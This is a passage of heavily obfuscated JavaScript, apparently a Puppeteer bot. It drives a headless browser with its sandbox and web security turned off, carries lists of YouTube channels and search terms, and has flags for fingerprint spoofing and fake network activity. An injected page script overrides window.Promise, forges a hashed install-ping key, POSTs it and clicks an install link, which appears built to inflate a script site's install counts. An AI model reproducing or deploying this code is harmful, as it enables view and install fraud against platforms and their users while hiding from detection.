                Q = this['blocks'];
              for (J = -0xfbb * -0x1 + 0x1baf + 0x3e * -0xb3; J < -0x1e25 + 0x16e2 + 0x793; ++J)
                K = Q[J - (0x119 * 0x7 + -0x401 + -0x3ab)] ^ Q[J - (0x22b1 * -0x1 + 0x318 + 0x1fa1)] ^ Q[J - (0x607 * -0x3 + 0x1580 + -0x35d * 0x1)] ^ Q[J - (0x16f * -0xe + 0x1a55 + -0x633)], Q[J] = K << -0x2492 + 0x68c + -0x1e07 * -0x1 | K >>> -0x19de + -0x79 * 0x2f + -0x2 * -0x181a;
              for (J = 0x709 * -0x1 + 0x26a5 + -0x484 * 0x7; J < -0x49a * 0x1 + 0x8fa + -0x5 * 0xdc; J += -0x9 * -0x35 + -0xacb * 0x3 + -0x1 * -0x1e89)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x654 + -0x25e8 + 0x1 * 0x1f99 | L >>> 0x245d + -0x1 * 0x206 + -0x223c) + (M & N | ~M & O) + P + (0x106 * 0x7dd641 + -0x3cb70e4e + 0x1ce5 * 0xc6cd) + Q[J] << -0x21 * 0x59 + -0x17 * 0x145 + 0x28ac) << 0x1696 + -0xbe9 + -0xaa8 | P >>> 0xd19 + 0x1 * 0x1f49 + -0x2c47) + (L & (M = M << -0x1d1 * 0x1 + -0x68e + 0x1 * 0x87d | M >>> 0x10c3 + 0x181 * 0xe + -0x25cf) | ~L & N) + O + (-0x3a180826 + 0x6b7ca7ab + 0x291dda14) + Q[J + (-0x53b + 0x340 + 0x2 * 0xfe)] << -0x307 * -0x1 + 0xbcd + -0xed4) << -0x59e * 0x1 + 0x1f70 * 0x1 + -0x19cd | O >>> -0xa * 0x264 + 0x9fd * 0x3 + -0x5f4) + (P & (L = L << 0xace + 0x50 + 0x2c * -0x40 | L >>> 0x18f3 * -0x1 + 0x1 * -0x1b4d + 0x3442) | ~P & M) + N + (0xaa48376 + -0x11dc1f3 * -0x77 + 0x9 * -0x5e293c2) + Q[J + (-0x26d3 + -0x214a + -0x25 * -0x1f3)] << -0x16 * 0x5b + 0x2120 + 0x2 * -0xca7) << -0x1212 + -0x12 * 0xe5 + -0x2231 * -0x1 | N >>> 0x235d + -0x214d + -0x1 * 0x1f5) + (O & (P = P << -0x20b3 + -0x87 * -0x24 + -0x1 * -0xdd5 | P >>> 0x15ef + 0x279 * 0x6 + -0x24c3) | ~O & L) + M + (-0x687f6579 + 0x28f72d8e * -0x4 + -0x2 * -0xb36f4aa5) + Q[J + (0x232f * -0x1 + 0x462 * 0x1 + -0x3a * -0x88)] << 0xf2e + 0x39e + -0x12cc) << -0x145 + 0x7d8 + -0x68e | M >>> -0xc42 + -0xc32 + -0x1 * -0x188f) + (N & (O = O << -0x6dd * 0x3 + -0x681 + 0x12 * 0x183 | O >>> -0x1e59 + 0xdff + 0x105c) | ~N & P) + L + (0x4ddb412a + 0x1 * -0x715aeba9 + -0x1 * -0x7e022418) + Q[J + (0x1547 + -0x1 * 0x251 + -0x12f2)] << -0x39 * 0x6c + -0x9c2 + 0x1 * 0x21ce, N = N << -0x25aa + -0x187 + 0x274f * 0x1 | N >>> -0x1bf9 + 0x1b0d + 0x7 * 0x22;
              for (; J < -0x21af + -0x11f8 + 0x33cf; J += 0xe9b * 0x1 + -0x5a7 + 0x1 * -0x8ef)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x2316 + -0x11f7 + -0x111a | L >>> -0x15e + 0x55 * 0x7 + 0x6d * -0x2) + (M ^ N ^ O) + P + (-0xfcecb7c * 0x3 + -0x4364b5f9 + 0xe1ab040e) + Q[J] << 0x7 * -0x28d + -0x452 * 0x1 + -0x1 * -0x162d) << -0x1bf * 0x13 + 0x9a0 + 0x1792 | P >>> -0x3 * 0x18e + 0x5 * -0x47 + 0x628) + (L ^ (M = M << -0x92 * 0x10 + 0x2502 + -0x1bc4 | M >>> -0x1231 * 0x2 + 0x1 * 0x1a0e + -0x31 * -0x36) ^ N) + O + (-0x54958ec7 + -0x90e267bd + 0x15451e225) + Q[J + (0x1c9 * 0x1 + -0x1100 + 0x1 * 0xf38)] << -0x5f1 + 0xab9 + -0x4c8) << 0x1 * -0x147e + 0x2 * -0xfb3 + 0x33e9 | O >>> 0x3ff + 0x54a + -0x92e) + (P ^ (L = L << 0xee1 + -0x53c + -0x32d * 0x3 | L >>> -0x1a * 0x13c + -0x1f34 + 0x3f4e * 0x1) ^ M) + N + (-0x637f8a55 + 0x750e7e3d + -0xddad * -0x6bbd) + Q[J + (-0x19ad + -0x1df3 + 0x1bd1 * 0x2)] << -0x1b65 + 0x13d * -0x3 + 0x1f1c) << 0x13 * -0x15d + 0x2629 + 0x1 * -0xc3d | N >>> 0x14c6 + 0x1 * 0x1351 + 0x6aa * -0x6) + (O ^ (P = P << -0x1 * -0x121a + 0x14a1 * 0x1 + -0x269d | P >>> -0x25fa + -0x12b9 * 0x1 + -0x38b5 * -0x1) ^ L) + M + (-0x5c5e68e7 + -0xcd00cbcf + 0x198392057) + Q[J + (0x1ca2 + -0x5ed * -0x1 + -0x42 * 0x86)] << -0x15f8 + 0x7 * 0x3e5 + -0x54b) << -0x2537 + -0x36 * -0x7a + 0x5c * 0x20 | M >>> -0x1070 + 0x982 + 0x709) + (N ^ (O = O << 0x2d0 + -0xbb7 * -0x1 + -0xe69 | O >>> 0x1 * 0x2406 + 0xaae * 0x3 + -0x440e) ^ P) + L + (-0xabe4a39 + -0x7f692f86 + -0x8 * -0x1f202cac) + Q[J + (-0xc2c + -0x1 * 0x1c6e + 0x289e)] << 0x70 + -0x2 * 0xb85 + 0x16 * 0x107, N = N << 0x3c4 + -0x1c4b * 0x1 + 0x18a5 | N >>> 0x2 * -0x1201 + 0x1 * 0x1d71 + -0x231 * -0x3;
              for (; J < 0x152 * -0x9 + 0x2 * -0xf1 + -0x8 * -0x1c0; J += 0x854 + 0xe2 + -0x931)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x24 * 0x63 + -0x1146 + 0x35f * 0x1 | L >>> 0x1e05 + 0xefe + 0xef8 * -0x3) + (M & N | M & O | N & O) + P - (0x10 * 0xdd99c2f + -0x237c4c95 + -0x49393337) + Q[J] << -0x31d * -0xa + -0x4 * -0x4a9 + -0x31c6) << 0x16d9 + 0x1f76 + -0x364a | P >>> -0x199 * 0x6 + 0x1530 + -0xb7f) + (L & (M = M << 0x1ebd + -0x1001 + 0x1 * -0xe9e | M >>> 0x102 * -0x1 + 0x540 * 0x1 + -0x43c) | L & N | M & N) + O - (-0x887 * -0x5baed + 0xa0911d25 + -0xe7c86 * 0x6aa) + Q[J + (0x3 * -0x849 + -0xfa7 * 0x1 + -0x1 * -0x2883)] << -0x1ada + 0x6c9 * -0x5 + 0x3cc7) << 0x219 * -0x5 + -0x493 * 0x4 + -0x99a * -0x3 | O >>> 0xd51 + 0xd13 * 0x1 + -0x3 * 0x8c3) + (P & (L = L << 0x12f * 0x1a + -0x11f * -0xb + -0x1f * 0x163 | L >>> 0x84 * -0x8 + -0x417 + 0x839) | P & M | L & M) + N - (-0x98aa25 * -0x155 + 0xa058fa03 + -0x62 * 0x28f2d54) + Q[J + (0xc2f + 0x8d * -0x3 + -0xa86)] << 0x6 * -0x1be + -0x1503 + 0x1f77) << -0x27 * -0x3 + -0x2392 + 0x2 * 0x1191 | N >>> 0x6 * 0x499 + 0x206d + -0x3be8) + (O & (P = P << 0x1274 + -0xec4 + 0x1 * -0x392 | P >>> -0x1 * 0x63c + -0x676 * 0x1 + 0xcb4) | O & L | P & L) + M - (0x3b24d4d3 + -0x1 * -0x346172e4 + -0x1511 * -0x109d) + Q[J + (-0x17ab * 0x1 + 0x5cf * -0x2 + -0x2f1 * -0xc)] << -0xcaf + -0x13 * -0x26 + 0x1 * 0x9dd) << 0xb * 0x30b + -0x3ed + -0x1d87 * 0x1 | M >>> -0x2b * -0x67 + 0xbe + -0x11f0) + (N & (O = O << 0xd30 * -0x1 + 0x4 * -0x854 + -0x1b * -0x1ba | O >>> -0xc3c + 0x270 + -0x1 * -0x9ce) | N & P | O & P) + L - (-0x78d936d * 0x1d + -0x6762 * -0xefd9 + 0xeb11d66b) + Q[J + (-0x2394 + -0x1134 + -0x3e * -0xda)] << -0x13a + 0x23e1 + -0x22a7 * 0x1, N = N << 0x2137 + -0xc5e + -0x14bb | N >>> 0x11a + -0x114e + -0x1036 * -0x1;
              for (; J < 0x1 * -0x47 + -0x1 * 0xab4 + 0x3b * 0x31; J += -0x20f1 + -0x4bc + 0x12d9 * 0x2)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2404 + -0x1747 * -0x1 + 0xcc2 | L >>> -0x174 + -0x1 * -0xb56 + -0x9c7) + (M ^ N ^ O) + P - (0x1 * -0x3493a3f9 + 0xf31bb77 + -0xf * -0x6110294) + Q[J] << -0xa7 * 0x27 + 0x1 * 0x1915 + 0x5c * 0x1) << -0x4 * -0x1b1 + -0x10 * 0xa3 + -0x371 * -0x1 | P >>> -0xe25 + 0xb9 * -0x23 + 0x278b) + (L ^ (M = M << 0x2202 + -0x563 * 0x3 + -0x11bb | M >>> -0x53 * -0x11 + -0xad5 + -0x155 * -0x4) ^ N) + O - (-0xd173 * 0x6205 + -0x40f21778 + 0xc6c172e1) + Q[J + (0x10bf + 0x1 * -0x23e2 + -0x64 * -0x31)] << -0x2 * 0x137d + 0xbad + -0x1 * -0x1b4d) << -0x1090 + 0x15ff + -0x56a | O >>> -0x260c + -0xbdf + 0x3206) + (P ^ (L = L << -0x73 * 0x1 + -0xd43 * 0x2 + 0x16d * 0x13 | L >>> 0x1 * -0x1990 + -0x21 * 0xdb + 0x35cd * 0x1) ^ M) + N - (0x6992b74e + -0x3afd44f + -0x3045a4d5) + Q[J + (0x2 * -0xb2d + -0x20e6 + -0x16 * -0x283)] << -0x514 + 0x9 * 0x41d + 0x1e1 * -0x11) << -0x82b * -0x1 + 0x1e34 + -0x265a | N >>> -0xf06 * -0x1 + 0x636 + -0x259 * 0x9) + (O ^ (P = P << 0x5 * 0x1bb + -0x2014 + 0x178b | P >>> -0x1f6 * -0x7 + 0x18e8 + -0x1350 * 0x2) ^ L) + M - (-0x5863a60b + -0xe24c99 + 0x14699942 * 0x7) + Q[J + (-0x22a1 + -0x1 * -0xf9a + 0x2 * 0x985)] << 0x1 * -0x19fb + 0x2107 + -0x70c) << -0x2383 + -0x90 + -0x6e * -0x54 | M >>> -0xe23 * 0x1 + -0x242f * -0x1 + -0x29 * 0x89) + (N ^ (O = O << -0x7b0 + -0x4b8 + 0xc86 | O >>> -0xe0c + -0x16f5 + 0x2503) ^ P) + L - (-0x13 * -0x390a4f9 + 0x1 * 0x4570a6f4 + -0x538fa745) + Q[J + (-0x7c4 + -0x93a + -0x137 * -0xe)] << -0x9 * 0x2df + -0x5 * 0x698 + 0x3acf * 0x1, N = N << -0x5bb + 0x42a * 0x2 + -0x5 * 0x7f | N >>> 0x101 * 0x11 + -0xb99 + 0x576 * -0x1;
              this['h0'] = this['h0'] + L << 0x287 * -0xb + -0x29 * -0x17 + 0x181e, this['h1'] = this['h1'] + M << -0x1 * -0x21d + 0x2 * 0xcd4 + -0x1bc5, this['h2'] = this['h2'] + N << 0x1c09 + -0x4a * 0x3c + 0xab1 * -0x1, this['h3'] = this['h3'] + O << -0x6f * -0x32 + -0x1680 + -0x5 * -0x2a, this['h4'] = this['h4'] + P << 0x1c * 0xef + 0x3 * -0xa73 + -0x535 * -0x1;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x1c * -0x114 + 0x3 * 0x31d + 0x14f5 & -0x68d + 0x1d * 0xd6 + 0x1 * -0x11a2] + w[J >> -0xc * 0x2b1 + -0x770 + 0x27d4 & -0x2689 + -0x5 * 0x709 + 0x49c5] + w[J >> 0x10e1 * -0x1 + 0x20c2 + -0x329 * 0x5 & -0x29 * 0xce + -0xb66 * 0x1 + -0x1 * -0x2c73] + w[J >> -0x58c + -0x1 * -0xbfb + 0x65f * -0x1 & 0xf7f + -0x19ce + -0x1 * -0xa5e] + w[J >> -0x2518 + -0x2 * 0x772 + 0x3408 & -0x14ec + 0x2 * 0x40f + 0x25 * 0x59] + w[J >> 0x204 + -0x1634 + 0x1438 & -0x1 * 0xabb + 0x1fd4 + -0x150a] + w[J >> 0x1 * -0x1d21 + 0x1 * 0x1de3 + 0xa * -0x13 & 0x1 * 0x1fe4 + -0x2bc + 0x1d19 * -0x1] + w[0xf37 + 0xf * 0x148 + 0x10 * -0x226 & J] + w[K >> 0x1dc6 + -0x210 * 0xb + 0x26 * -0x2f & 0x1 * -0x1fa9 + -0x10 * -0x25 + 0x1d68 * 0x1] + w[K >> 0x28 * -0xf9 + -0x5fa + 0x2cfa & -0x1318 + 0x1 * 0x22c6 + -0xf9f] + w[K >> -0x515 * -0x1 + -0x1237 * 0x1 + 0x59 * 0x26 & 0x1 * -0x1a21 + -0xc09 + 0x2639] + w[K >> -0x2134 + -0xd * -0x23d + 0x42b & 0x2050 + -0x11e3 + -0x4ca * 0x3] + w[K >> -0xa * -0x37 + -0x1c37 + 0x1a1d & 0x1810 + -0x13ba + -0x49 * 0xf] + w[K >> 0x1 * -0x1c83 + 0x107 * -0xb + 0x27d8 & -0x74f + -0x2a4 * -0x3 + -0x8e] + w[K >> -0x1bd + -0x191d + -0x1ade * -0x1 & 0x79b * -0x3 + -0x96a + 0x204a] + w[-0xeb * 0x8 + 0x1a1 + -0x2e3 * -0x2 & K] + w[L >> 0x1e17 * -0x1 + -0x9ff * -0x3 + 0x1 * 0x36 & -0x1 * 0x1d63 + 0x25b6 + 0x2 * -0x422] + w[L >> -0x1233 + -0x25b7 + 0x3802 * 0x1 & -0x930 + -0x1 * -0x845 + 0x7d * 0x2] + w[L >> -0x4 * -0x8a1 + 0x9 * -0xf5 + -0x19d3 & 0xb0 * -0x26 + -0x19db * -0x1 + -0x7 * -0xc] + w[L >> -0x1 * 0x1c6f + -0x4 * -0x4db + -0x17 * -0x65 & -0x2 * 0x18e + -0x11c7 + 0x14f2 * 0x1] + w[L >> -0x9 * 0x2d1 + 0x1db5 + -0x450 & 0x414 * 0x5 + 0x22e7 * 0x1 + -0x373c] + w[L >> -0xad7 * 0x2 + 0x3 * 0x347 + 0xbe1 * 0x1 & -0x12da + 0xd1e + 0x5cb] + w[L >> -0xdcb * 0x1 + 0x141f + 0x328 * -0x2 & 0x152 * 0xb + -0xc89 * 0x1 + -0x1ee] + w[-0x233a + -0xd51 + 0x309a & L] + w[M >> -0x1 * -0x2700 + -0x1b5b * -0x1 + -0x423f & 0x26ee + 0x4 * 0x20e + 0x96b * -0x5] + w[M >> -0x6a2 * 0x3 + -0xb2a + 0x2 * 0xf94 & -0x2fc * -0x5 + 0x1 * 0x16a5 + 0x2582 * -0x1] + w[M >> 0x1763 * 0x1 + -0x29 * -0xbf + -0x35e6 & -0x2e * 0xa6 + 0x1 * -0x14f6 + 0x10f3 * 0x3] + w[M >> 0x26dd + -0x15c8 + -0x1105 & -0x1253 * -0x1 + 0x1a53 + -0x2c97] + w[M >> -0x227e + 0x25c4 + -0x3b * 0xe & 0xb * -0x1e + -0xa2b + 0xb84] + w[M >> -0xd40 + 0x1081 + -0x339 & 0xdc7 + -0x1 * 0xd54 + -0x64] + w[M >> 0x18b + 0x2432 + -0x25b9 & 0x2 * 0x2b9 + 0x1 * -0x4f + 0x1a * -0x32] + w[-0x688 + 0x922 + 0x5d * -0x7 & M] + w[N >> 0x6c8 + 0x1 * 0x8b + 0x737 * -0x1 & -0x3 * -0x730 + 0x22b * -0x1 + -0x1356] + w[N >> 0x2 * -0xce5 + 0x4de + 0xa * 0x21a & -0x1cee + -0x8bb + 0x25b8] + w[N >> 0x26e0 + 0x6ae + 0x2 * -0x16bd & -0x250f + 0x1db * 0x7 + 0x1821] + w[N >> -0x8a7 + -0x97 * -0x33 + -0x155e & -0x158b * -0x1 + -0x1d59 + 0x7dd] + w[N >> 0x10fb + -0x1 * -0x971 + 0x20 * -0xd3 & 0x1980 + -0x17 * -0x50 + -0x20a1 * 0x1] + w[N >> -0x1f5a + 0xc41 * 0x1 + -0x1 * -0x1321 & -0x9d4 + -0x3 * 0xceb + 0x30a4] + w[N >> 0x1 * -0x1f61 + 0x9b * -0xa + -0x1 * -0x2573 & 0x47 * 0x6f + 0x4 * 0x32b + -0x2b66] + w[-0xb01 + -0x1 * -0x2452 + -0x1942 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0xd * 0x99 + 0x153d * 0x1 + -0xd6 * 0x10 & 0x11f + 0xf07 + -0xf27,
                J >> -0x1196 + 0x1 * -0x92 + 0x1238 & 0xa94 + -0x108d + -0x37c * -0x2,
                J >> 0x12e7 * 0x2 + -0x2621 + 0x5b & -0x1d42 + 0x1039 + 0x704 * 0x2,
                -0x28 * 0xed + 0x2367 + -0x6 * -0x70 & J,
                K >> -0x398 + -0x3 * -0x77e + -0x25 * 0x82 & -0x437 + 0x1 * -0x1726 + -0x294 * -0xb,
                K >> -0xd72 * 0x1 + -0xaff + 0x33 * 0x7b & 0x14e0 + 0x1 * 0x134b + -0x272c,
                K >> -0xa6 * 0x16 + 0x4 * -0x44 + -0x4 * -0x3d7 & -0x175f * 0x1 + 0x1965 + -0x1 * 0x107,
                0x2248 + -0x623 + 0x8b * -0x32 & K,
                L >> 0x8bf * -0x3 + 0xfc9 + 0x1b * 0x64 & -0x42 * 0x2b + 0x17db + -0xbc6,
                L >> 0x1a9e + 0x682 + -0x844 * 0x4 & -0x128 * -0x18 + 0x9e3 + -0x24a4,
                L >> -0x7c2 + 0x1240 + -0xa76 & -0x1933 * -0x1 + 0x2585 + -0x3db9,
                0xbc4 + -0xdb * 0xb + -0x15c & L,
                M >> 0x1ae1 + -0x74a + -0x137f & -0x62d * -0x4 + -0xea3 + -0x489 * 0x2,
                M >> 0x6e8 + 0x136e + -0x1a46 & -0x25a5 + 0xb61 + 0x3e5 * 0x7,
                M >> -0x1a80 + 0x9 * -0x40c + -0x44 * -0xed & -0x1ae1 + 0xd58 + -0x9b * -0x18,
                -0x10ed + 0x1ffc * 0x1 + 0x18 * -0x96 & M,
                N >> -0x1f * -0x54 + -0x1b2 + -0x862 & -0x239 * -0x4 + 0x665 * 0x1 + -0xe4a,
                N >> -0x12e * 0x8 + -0xb16 + 0x1496 & 0x448 + -0x1b1 * 0x1 + -0x22 * 0xc,
                N >> -0x1 * 0x13fa + 0xdd + 0x1325 & 0x3 * -0x60 + 0x379 * 0x7 + -0x1630,
                -0x245e + -0x2399 + 0x48f6 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0xbd7 * 0x3 + 0x70c + 0x1c8d * 0x1), (K = new DataView(J))['setUint32'](-0xdfe + 0x1d01 + 0x225 * -0x7, this['h0']), K['setUint32'](0x916 * -0x2 + 0x1 * 0x95 + 0x119b, this['h1']), K['setUint32'](0x2e0 * -0xd + 0x21f3 + -0x3b * -0xf, this['h2']), K['setUint32'](-0x367 + 0x2329 + 0x2e2 * -0xb, this['h3']), K['setUint32'](-0x610 + -0x1d * -0x53 + -0x347, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x17 * -0xe3 + -0x15f2 + 0x18d];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x103a + 0x17ca + -0x1a * 0x18a;
            J[-0x3 * 0x3c7 + 0x1b4f + -0xa * 0x199]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x1906 + 0x5 * 0x412 + 0x4ac] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0xd39 * -0x2 + -0x7ce + 0x2241), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0xa6d * -0x3 + 0x1099 + 0xeaf;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x1 * 0x2a5 + 0xbd * -0xb + -0x1 * -0xb56), Promise['resolve'](-0x8 * -0x194 + 0x19ce + 0x9 * -0x445);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0xa9 * -0x37 + 0x413 + 0x2 * 0x101e; j < -0x6aa + -0x2158 + 0x2803; j++)
    i();
}
const NETWORK_PATIENCE = -0x1 * 0x273b + 0xd1d + 0x395e + (-0x36 * 0xa4 + 0x24fb * -0x1 + 0x534b) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x35 * 0x2b + 0x1 * -0x1e1 + 0xacb) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function a() {
  const bh = [
    'WOnby8oXWPhdPCoUg3FcUq',
    'Ahr0Chm6lY93DW',
    'jNddVtnopCkfW4XnWOu',
    'm2WYntnYrvnRDW',
    'tufjtG',
    'whK9rmkvW4vOm8oPW4m',
    'WPaAuhyWWRtdVCoqW50',
    'BNmTAw8Tz2fTzq',
    'w.youtube.',
    'pts/430335',
    'ESoad8kjW7xdUSkHm8kb',
    'u2fMyxjPlZuZnW',
    'CMCVzw4VC2nYAq',
    'W5VdHfLXW7OjeSo8W5bm',
    'oc4WlJaUmcbtyq',
    'W5rTW6XTahFcJYFcKqu',
    'necraft\x20ch',
    '4QB59etj0I',
    'W4esW6JdGflcTXVcI8odtq',
    'WRu+W4ldKhBcLtldVSkAoa',
    'W7uWBq4TWPvEWPJdMbu'
  ];
  a = function() {
    return bh;
  };
  return a();
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    S(0x1) + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + T(0x8) + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x822 * -0x4 + -0x2 * 0xf6d + -0x5 * 0x56);
    let h = e[f];
    return h;
  }, d(b, c);
}
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x1 * -0x1876 + 0x1096 + 0xa8 * 0xc; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + U(0xd, 'I(fs') + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + T(0x10) + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x1ea4 + -0x12 * -0x41 + 0x8b4 * 0x3)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0xbae + -0x227f + 0x16db)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 